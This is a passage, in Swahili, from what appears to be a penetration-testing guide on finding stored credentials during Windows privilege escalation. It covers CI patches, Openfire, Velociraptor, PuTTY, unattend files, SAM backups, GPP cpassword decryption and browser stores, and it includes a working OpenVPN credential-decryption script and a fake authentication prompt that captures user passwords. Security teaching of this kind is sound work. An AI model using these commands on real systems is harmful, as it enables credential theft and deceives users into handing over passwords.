Seva ya CI inaweza kuhifadhi mabadiliko ya chanzo yaliyowasilishwa kwenye saraka yake ya data hata baada ya build kukamilika. [TeamCity inaandika](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) kwamba `system/changes` hutumika kuhifadhi mabadiliko ya remote-run; saraka ya data inaweza kusanidiwa na si lazima iwe chini ya `ProgramData`. Patch inayosomeka inaweza kuhifadhi marejeleo yaliyoongezwa au kuondolewa ya faili ya credential, ufunguo wa usimbaji fiche, au script inayotumia vyote viwili. Kwa mfano, mchakato wa PowerShell wa `ConvertTo-SecureString -Key` unahitaji ufunguo wa AES pamoja na mfuatano uliosimbwa kwa njia fiche; [Microsoft inaandika](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) kwamba ufunguo hutolewa kando. Kagua majina ya patches zinazoweza kufikiwa kwanza, kisha kagua maudhui husika kwa idhini bila kuchapisha siri kwenye matokeo ya kawaida ya enumeration. Njia ya patch, thamani iliyosimbwa kwa njia fiche, au rejeleo la ufunguo pekee havithibitishi credential halali au ufikiaji wenye ruhusa za juu zaidi. Zuia ACL za saraka ya data na epuka kuweka siri kwenye mabadiliko ya build.

### Mzunguko maalum wa nywila ya msimamizi wa ndani

Kibadilishaji nywila kilichotengenezwa kienyeji kinaweza kuhifadhi nywila iliyosimbwa kwa njia fiche ya msimamizi wa ndani kwenye huduma ya ndani huku kikihifadhi credentials za datastore kwenye faili ya `.env` inayosomeka au karibu na binary ya kisasishaji. Kagua kwa pamoja scheduled task ya kisasishaji, akaunti, ACL za usanidi, listener na ruhusa za datastore. Datastore inayosikiliza loopback pekee bado inaweza kufikiwa na mtumiaji wa ndani mwenye credentials halali, lakini uthibitishaji pekee hauthibitishi ruhusa ya kusoma rekodi husika. Ikiwa seed ya usimbaji fiche au nyenzo ya ufunguo inapatikana karibu na ciphertext, kagua hasa jinsi ufunguo unavyotokana kabla ya kuamini usimbaji fiche huo. Mpango unaotumia seed iliyoanikwa kuunda ufunguo wa AES kwa njia bainifu kupitia Go [`math/rand`](https://pkg.go.dev/math/rand) haufai kulinda nywila hiyo; Go inaeleza kuwa package hiyo haifai kwa randomness inayohusu usalama. Thibitisha kuwa nywila yoyote iliyorejeshwa bado inatumika na ni ya akaunti iliyo kwenye kikundi cha Administrators cha ndani kabla ya kuichukulia kama njia ya escalation. Scheduled task, njia ya `.env`, au blob iliyosimbwa kwa njia fiche pekee havithibitishi masharti hayo. Usijumuishe nywila na nyenzo za ufunguo kwenye matokeo ya kawaida ya enumeration.

Tumia [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) kudhibiti nywila za wasimamizi wa ndani. Hifadhi yake inayotegemea directory au Entra na vidhibiti vya ufikiaji ni tofauti na datastore maalum ya ndani; vivyo hivyo, [roles za Elasticsearch](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) huamua kama mtumiaji wa datastore aliyethibitishwa anaweza kusoma index maalum.

### Nyaraka za plugin za seva ya Java na matumizi tena ya credentials

Baadhi ya plugins za seva ya Java husambazwa kama nyaraka za JAR kwenye saraka ya `plugins` ya seva. Plugin maalum inayosomeka inaweza kuwa na usanidi au bytecode yenye credential ya huduma iliyopachikwa. Kagua nyaraka hiyo tu kwa idhini na usijumuishe siri zilizorejeshwa kwenye matokeo ya kawaida ya enumeration. Njia ya plugin pekee haithibitishi kuwa kuna siri, na nywila ya huduma iliyorejeshwa huleta ruhusa za juu zaidi tu ikiwa pia inatumika kwa akaunti yenye ruhusa za juu zaidi. Kagua ACL za faili husika na badilisha credentials zilizotumika tena kwa siri tofauti. Tazama [mwongozo wa usakinishaji wa plugin wa PaperMC](https://docs.papermc.io/paper/adding-plugins/) kwa muundo wa saraka na [nyaraka za JAR za Oracle](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) kwa maudhui ya nyaraka.

### Credentials za hifadhidata iliyopachikwa ya Openfire

Usakinishaji wa Openfire unaotumia hifadhidata iliyopachikwa unaweza kuhifadhi `openfire.script` chini ya `Openfire\embedded-db`. Ikiwa akaunti ya sasa inaweza kuisoma, kagua rekodi za `OFUSER` pamoja na property ya `passwordKey`. [Nyaraka za Openfire za user-provider](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) zinasema kuwa nywila zinaweza kuhifadhiwa kama maandishi ya kawaida au kusimbwa kwa njia fiche kwa ufunguo uliohifadhiwa kwenye property hiyo. Nywila iliyorejeshwa ni muhimu kwa escalation tu ikiwa bado inatumika kwa utambulisho wenye ruhusa za juu zaidi; jina la faili pekee halithibitishi ufikiaji wa kusoma wala matumizi tena ya credential. Njia hiyo ni kidokezo cha inventory, kwa hiyo usijumuishe maudhui ya hifadhidata na credentials kwenye matokeo ya kawaida ya enumeration.

Faili tofauti ya `Openfire\conf\openfire.xml` inaweza kufichua porti na kiolesura cha bind vilivyosaniwa kwa console ya msimamizi hata wakati hifadhidata ya nje inatumika. Kwa kawaida Openfire hufunga console yake ya msimamizi kwenye loopback; hata hivyo, akaunti ya ndani inaweza kufikia anwani hiyo ikiwa listener inafanya kazi. Kagua listener halisi, role ya msimamizi iliyoidhinishwa, sera ya kupakia plugins, na utambulisho wa huduma ya Openfire kwa pamoja. Msimamizi anayeweza kusakinisha plugin anaweza kufanya msimbo wa plugin uendeshwe katika muktadha wa huduma, ambao unaweza kuwa na ruhusa za juu sana ikiwa huduma inaendeshwa kama LocalSystem. Nywila inayolingana ya akaunti au njia ya usanidi inayosomeka pekee haithibitishi ufikiaji wa console ya msimamizi au utekelezaji wa msimbo. Tazama [mwongozo wa vendor wa usakinishaji na usimamizi wa plugins](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) na [property ya API ya kupakia plugins](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Usanidi wa seva ya usimamizi wa uchunguzi wa kidijitali

Usanidi wa seva ya Velociraptor, ambao mara nyingi huitwa `server.config.yaml`, unaweza kuwa na `CA.private_key` ya CA ya ndani. Ikiwa mtumiaji mwenye ruhusa za chini anaweza kusoma ufunguo huo, anaweza kuweza kutengeneza cheti cha mteja cha API. Ikiwa hii itasababisha ruhusa za juu zaidi hutegemea roles za watumiaji za seva, ufikikaji wa API, na utambulisho ambao seva au agent lengwa inaendeshwa nao. Usanidi wa mteja una nyenzo tofauti; kuupata hakuthibitishi ufikiaji wa CA ya seva. Baadhi ya deployments huweka ufunguo binafsi wa CA nje ya mtandao, kwa hiyo usanidi wa seva unaosomeka unaweza pia kukosa ufunguo wa kusaini.

Kwenye seva ya Windows, kagua ACL ya usanidi wa **seva** kwenye saraka yake ya usakinishaji na nakala zozote za backup zilizolindwa. Eneo moja linalowezekana ni `%ProgramFiles%\VelociraptorServer\server.config.yaml`; tumia njia iliyosanidiwa ya huduma ikiwa ni tofauti. Thibitisha kuwa utambulisho wa sasa unaweza kusoma faili na kwamba `CA.private_key` ipo kweli. Epuka kuchapisha ufunguo binafsi kwenye logi au matokeo ya enumeration. Mchakato wa vendor wa `config api_client` hutumia ufunguo wa CA kutoa cheti cha mteja, lakini role inayotumika upande wa seva pia inahitajika; kuunda au kubadilisha role kunaweza kuhitaji ruhusa ya kuandika kwenye datastore au kuwasha upya huduma. Utambulisho uliopo wa seva wenye ruhusa za juu unaweza kutoa njia hata ikiwa ruhusa hizo za kuandika hazipatikani. Hoja za API zenye haki za utekelezaji huendeshwa katika muktadha husika wa seva au agent, ambao unaweza kuwa na ruhusa za juu sana.

Linda usanidi wa seva na backups zake kwa ACL zenye vizuizi, weka ufunguo wa kusaini wa CA nje ya mtandao inapowezekana, na punguza roles za API na ufikiaji wa listener. Tazama [nyaraka za API za Velociraptor](https://docs.velociraptor.app/docs/server_automation/server_api/) na [mwongozo wa usanidi wa usalama](https://docs.velociraptor.app/docs/deployment/security/).

### Putty Creds

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY ni kidhibiti tofauti cha vipindi. Hifadhi yake asilia iliyosimbwa kwa njia fiche inaweza kuwa katika `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, huku nakala rudufu ya vipindi iliyohamishwa inaweza kuitwa `sessions-backup.dat` na kuhifadhiwa mahali pengine. [Mwongozo wa SolarWinds wa kuhamisha data](https://thwack.solarwinds.com/discussion/comment/115591) unasema kwamba data inayohamishwa husimbwa kwa nenosiri na inaweza kuwa na vipindi, funguo, scripts, tags na mahusiano; [jukwaa lake la usaidizi](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) linabainisha hifadhi asilia. Kwanza, kagua ruhusa za faili na njia zake. Kupata mojawapo ya faili hizi hakufichui nenosiri lake, wala hakuthibitishi kwamba kitambulisho chochote kilichohifadhiwa bado ni halali au kina ruhusa za juu zaidi.

### Funguo za Host za Putty SSH

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### Funguo za SSH kwenye registry

Funguo za kibinafsi za SSH zinaweza kuhifadhiwa ndani ya ufunguo wa registry `HKCU\Software\OpenSSH\Agent\Keys`, kwa hivyo unapaswa kuangalia kama kuna chochote cha kuvutia humo:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Ukipata ingizo lolote ndani ya path hiyo, huenda likawa SSH key iliyohifadhiwa. Limehifadhiwa kwa usimbaji fiche lakini linaweza kufichuliwa kwa urahisi kwa kutumia [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Maelezo zaidi kuhusu mbinu hii yako hapa: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Ikiwa huduma ya `ssh-agent` haifanyi kazi na unataka ianze kiotomatiki kompyuta inapowashwa, endesha:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Inaonekana kuwa mbinu hii haifanyi kazi tena. Nilijaribu kuunda baadhi ya ssh keys, kuziongeza kwa `ssh-add` na kuingia kwenye mashine kupitia ssh. Registry HKCU\Software\OpenSSH\Agent\Keys haipo na procmon haikutambua matumizi ya `dpapi.dll` wakati wa uthibitishaji wa asymmetric key.

### Faili zisizohudhuria

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Unaweza pia kutafuta faili hizi kwa kutumia **metasploit**: _post/windows/gather/enum_unattend_

Maudhui ya mfano:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Nakala za akiba za SAM & SYSTEM

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Faili za backup za Windows Imaging (`.wim`) zinazosomeka zinaweza pia kuwa na hives za `SAM`, `SECURITY`, na `SYSTEM` za offline. Kipaumbele kiwe kwa saraka za backup au image zinazoweza kufikiwa ndani ya mfumo, na ukague **majina ya vipengee** vya image kabla ya kutoa chochote; jina la faili la `.wim` pekee halithibitishi kuwa hives zimefichuliwa, na `install.wim`, `boot.wim`, pamoja na recovery images za kawaida mara nyingi hupotosha. SMB share ni njia tofauti ya kufikia faili na inapaswa kukaguliwa tu ikiwa share hiyo iko ndani ya upeo wa kazi. Tazama mwongozo wa Microsoft kuhusu [Windows images](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) na [marejeleo ya faili za registry hive](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Sifa za Cloud

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Tafuta faili linaloitwa **SiteList.xml**

### Nenosiri la GPP lililohifadhiwa kwenye cache

Hapo awali kulikuwa na kipengele kilichoruhusu usambazaji wa akaunti maalum za msimamizi wa ndani kwenye kundi la mashine kupitia Group Policy Preferences (GPP). Hata hivyo, mbinu hii ilikuwa na dosari kubwa za usalama. Kwanza, Group Policy Objects (GPOs), zilizohifadhiwa kama faili za XML kwenye SYSVOL, zingeweza kufikiwa na mtumiaji yeyote wa kikoa. Pili, nenosiri ndani ya GPP hizi, lililosimbwa kwa AES256 kwa kutumia ufunguo chaguomsingi uliowekwa wazi hadharani, lingeweza kusimbuliwa na mtumiaji yeyote aliyethibitishwa. Hili lilikuwa hatari kubwa, kwani lingeweza kuwawezesha watumiaji kupata ruhusa za juu.

Ili kupunguza hatari hii, kazi ilitengenezwa ili kutafuta faili za GPP zilizohifadhiwa kwenye cache ya ndani zenye sehemu ya "cpassword" isiyo tupu. Faili kama hiyo inapopatikana, kazi hiyo husimbua nenosiri na kurejesha object maalum ya PowerShell. Object hii ina maelezo kuhusu GPP na mahali faili ilipo, na kusaidia kutambua na kurekebisha athari hii ya kiusalama.

Tafuta faili hizi ndani ya `C:\ProgramData\Microsoft\Group Policy\history` au ndani ya _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (kabla ya W Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Kusimbua cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Kutumia crackmapexec kupata nywila:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Mfano wa web.config yenye taarifa za kuingia:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Kumbukumbu rudufu za hifadhi kwenye webroot ya IIS

Kumbukumbu rudufu ya zamani ya ZIP iliyowekwa moja kwa moja kwenye webroot inayohudumia maudhui inaweza kufichua faili za usanidi za awali na taarifa za kuingia zinazoweza kutumiwa tena. Kagua njia halisi iliyosanidiwa ya tovuti na uthibitishe kama kumbukumbu hiyo inaweza kufikiwa kupitia HTTP kabla ya kuichukulia kuwa imefichuliwa. Njia chaguomsingi ya `C:\inetpub\wwwroot` ni eneo la kuanzia tu. Orodha ya haraka ya faili za ndani inaweza kuonyesha majina na ukubwa bila kufungua kumbukumbu:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Jina la archive halithibitishi kwamba ina siri au kwamba kitambulisho kilichopatikana kinatoa ruhusa za juu zaidi.

### Hati tambulishi za OpenVPN

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Kumbukumbu

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Omba taarifa za kuingia

Unaweza **kumwomba mtumiaji aweke taarifa zake za kuingia au hata taarifa za kuingia za mtumiaji mwingine** ikiwa unadhani anaweza kuzijua (kumbuka kwamba **kumwomba** mteja moja kwa moja **taarifa za kuingia** ni **hatari** sana):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Majina ya faili yanayoweza kuwa na taarifa za uthibitishaji**

Faili zinazojulikana kuwa na **nywila** katika **maandishi wazi** au **Base64** wakati fulani uliopita

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Lahaja ya orodha ya majina ya faili bila kiendelezi cha Password Safe

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Hifadhidata za Password Safe v3 kwa kawaida hutumia kiendelezi cha `.psafe3`. Chukulia jina la faili linalolingana kama uwezekano wa vault iliyosimbwa kwa njia fiche; kuwepo kwake hakuthibitishi kuwa unaweza kuisoma, kuifungua au kutumia kitambulisho chochote kilichohifadhiwa humo. Unapokagua mahali faili hizo zimehifadhiwa, angalia wasifu wa watumiaji unaoweza kufikia na mizizi iliyosanidiwa ya kushiriki faili.

Faili ya KeePass `.kdbx` inayosomeka nayo ni kidokezo tu cha vault iliyosimbwa kwa njia fiche. Kuifungua kunahitaji nenosiri kuu halisi pamoja na faili yoyote ya ufunguo au vipengele vya akaunti vilivyosaniwa. Ikiwa ukaguzi ulioidhinishwa utapata jozi ya hash ya LM:NT katika ingizo, thibitisha akaunti iliyotajwa na kama hash ya NT bado ni ya sasa na inakubaliwa na huduma ya NTLM ya lengwa kabla ya kuzingatia [pass-the-hash](../ntlm/README.md#pass-the-hash). Ingizo la vault halikupi haki za Administrator au SYSTEM lenyewe; ufikiaji wa huduma ya mbali, haki za akaunti na hatua yoyote tofauti ya kutekeleza huduma lazima pia viwepo. Orodha ya mali inapaswa kuripoti njia ya vault na kama inasomeka, si kuchapisha hifadhidata au kitambulisho kilichohifadhiwa.

Tafuta faili zote zilizopendekezwa:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Lahaja ya amri ya kutafuta bila kiendelezi cha Password Safe

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Credentials katika RecycleBin

Unapaswa pia kuangalia Recycle Bin kutafuta credentials

Kagua maingizo ya Recycle Bin yaliyofutwa unayoweza kufikia ili kutafuta nakala za chelezo na kumbukumbu za usanidi, pamoja na faili ambazo majina yake yanataja credentials waziwazi. Nakala ya chelezo ya `.7z`, `.zip`, au `.rar` inaweza kuwa na miezi kadhaa na kuwa na jina la kawaida. Windows huhifadhi njia ya awali na muda wa kufutwa kwenye rekodi ya `$I`, na faili iliyofutwa kama ingizo lake linalolingana la `$R`; kagua metadata na ruhusa za sasa za utambulisho wako kusoma faili kabla ya kufungua kumbukumbu. Kinachoonekana hutegemea volume, SID ya mtumiaji, na ruhusa za faili, kwa hivyo orodha tupu haithibitishi kuwa hakuna nakala ya chelezo inayoweza kurejeshwa. Chukulia jina la kumbukumbu kama kitu kinachofaa kukaguliwa, si uthibitisho kwamba kina siri halali.

Faili ya `.pfx` iliyofutwa unayoweza kufikia inaweza pia kuwa kidokezo cha **code-signing**. Ikiwa ina private key unayoweza kufikia, key hiyo inaweza kusaini script ya PowerShell iliyobadilishwa; [PowerShell inahitaji cheti cha code-signing chenye private key](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), na [sheria za AppLocker za publisher hukagua utambulisho wa msainishaji na wigo wa sheria](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Utekelezaji kati ya akaunti tofauti unahitaji utambulisho wa sasa uweze kurekebisha script husika, sheria inayotumika ikubali sahihi inayotokana nayo kwa script na akaunti lengwa, na scheduled task au programu nyingine yenye ruhusa za juu iendeshe script hiyo. Jina la faili la `.pfx`, subject ya cheti, au script inayoweza kuandikwa peke yake haithibitishi mnyororo huo. Kagua metadata, ACL, sera, na amri iliyopangwa kabla ya kufungua nyenzo za private key au kuanzisha task.

Pia kagua hifadhidata za wasifu wa messaging client, dokezo, na faili ulizopokea unazoweza kufikia ili kutafuta vidokezo vya credentials. Export ya urejeshaji ya BitLocker inaweza kuhifadhiwa kama HTML au TXT, wakati mwingine ndani ya kumbukumbu ya nakala ya chelezo yenye jina. Nyenzo hizo zinaweza kutoa ufikiaji wa volume tofauti ya data iliyosimbwa kwa njia fiche iliyo na nakala za zamani za chelezo; kagua volume na kumbukumbu hiyo tu ikiwa una ruhusa ya kufanya hivyo. Ikiwa nakala ya chelezo ina `NTDS.dit`, urejeshaji wa credentials za domain ukiwa nje ya mtandao unahitaji pia hive inayolingana ya `SYSTEM`, kama ilivyoelezwa kwenye [workflow ya nakala za chelezo na makundi yenye ruhusa za juu](../active-directory-methodology/privileged-groups-and-token-privileges.md). Majina ya faili na volume iliyofungwa peke yake hayathibitishi kuwa kuna recovery key inayoweza kutumika au nakala ya chelezo ya domain.

Ili **kurejesha nywila** zilizohifadhiwa na programu kadhaa unaweza kutumia: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Ndani ya registry

**Funguo nyingine zinazowezekana za registry zenye credentials**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Toa funguo za openssh kutoka kwenye registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historia ya Vivinjari

Unapaswa kuangalia dbs ambako manenosiri ya **Chrome au Firefox** yamehifadhiwa.\
Unapaswa kuangalia dbs ambako manenosiri ya **Chrome, Edge, au Firefox** yamehifadhiwa.\
Pia angalia historia, bookmarks na favourites za vivinjari ili kuona kama huenda **manenosiri yamehifadhiwa** humo.

Kwa wasifu wa kawaida wa **Default** wa Edge wa mtumiaji wa sasa, `Login Data` iko chini ya `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, huku `Local State` ikiwa kwenye saraka yake kuu ya `User Data`. [Microsoft inaeleza mahali chaguomsingi pa wasifu](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); wasifu mwingine au sera ya `UserDataDir` inaweza kuuhamisha. Kuwepo kwa faili kunatoa tu kidokezo cha mahali pa kuhifadhi vitambulisho: thibitisha kwamba faili zinasomeka, muktadha wa DPAPI wa mtumiaji husika au nyenzo nyingine za ufunguo zilizoidhinishwa, na kama login iliyohifadhiwa ni ya akaunti yenye haki za juu zaidi. Kuhesabu njia pekee hakuhitaji kufungua database au kuchapisha manenosiri yaliyofumbuliwa.

